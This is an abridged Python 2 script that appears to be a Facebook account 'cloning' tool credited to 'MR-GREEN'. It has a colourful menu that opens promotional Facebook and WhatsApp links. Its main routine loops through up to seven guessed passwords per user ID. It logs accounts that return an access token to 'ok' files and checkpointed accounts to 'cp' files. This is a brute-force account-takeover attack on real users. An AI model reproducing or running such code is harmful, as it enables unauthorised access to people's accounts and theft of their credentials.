...
logo = '\n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : TAMIM AHMED \x1b[1;33m\xf0\x9f\x94\xa5MR-GREEN\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m WhatsApp  : 0188010****\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/MR-GREEN3\n\x1b[1;93m______________________________________________________\n'
...
def main():
    ...
    print '\x1b[1;93m[4] \x1b[1;92mjoin Our Facebook Page '
    print '\x1b[1;93m[0] \x1b[1;92mExit'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    os.system('xdg-open https://www.facebook.com/profile.php?id=100083010579730')
    main_select()
...
def main_select():
    ...
    if SYED == '':
        ...
        os.system('xdg-open https://wa.me/+8801880108480')
        main()
    elif SYED == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100083010579730')
        main()
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Syedok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Syedok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('tamimok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('tamimcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('tamimok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('tamimcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('tamimok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('tamimcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[MR-GREEN-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('tamimok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[MR-GREEN-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('tamim.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: MR-GREEN.txt'
    print 54 * '_'
    print ''
    print ''
